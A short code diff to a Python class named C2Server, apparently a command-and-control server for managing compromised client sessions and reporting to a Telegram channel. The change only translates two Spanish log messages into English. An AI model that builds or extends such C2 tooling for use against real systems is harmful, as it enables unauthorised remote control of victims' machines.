@@ -251,7 +251,7 @@ class C2Server:
             try:
                 data = self.recv_all(session.socket)
                 if not data:
-                    print(colored(f"[!] Cliente {session.ip} desconectado.", 'red'))
+                    print(colored(f"[!] Client {session.ip} disconected.", 'red'))
                     session.close()
                     del self.clients[session.ip]
                     return
@@ -312,7 +312,7 @@ class C2Server:
                     bot.send_message(C2_CHANNEL_ID, f"❌ Unknown message type from {session.ip}", message_thread_id=topic_id)
 
             except Exception as e:
-                print(colored(f"[!] Error en recv_loop de {session.ip}: {e}", 'red'))
+                print(colored(f"[!] Error in connection with {session.ip}: {e}", 'red'))
                 session.close()
                 if session.ip in self.clients:
                     del self.clients[session.ip]
